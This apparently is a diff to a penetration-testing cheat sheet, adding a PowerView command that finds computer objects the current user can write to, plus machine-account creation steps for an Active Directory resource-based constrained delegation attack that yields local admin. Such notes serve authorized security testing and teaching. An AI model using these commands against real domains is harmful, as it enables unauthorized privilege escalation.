@@ -1108,6 +1108,13 @@ For the computer object we can simply create a new machine account (with SPN), i
 
 Therefore if we have ```"Owner"``` ```"WriteProperty"``` or ```"GenericWrite"``` permissions to ANY computer object within an environment, we can attain localadmin on that machine by way of RBCD.
 
+search for writable server:
+```
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+```
+
+
+create machine account and run s4u:
 ```
 New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
 $ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid
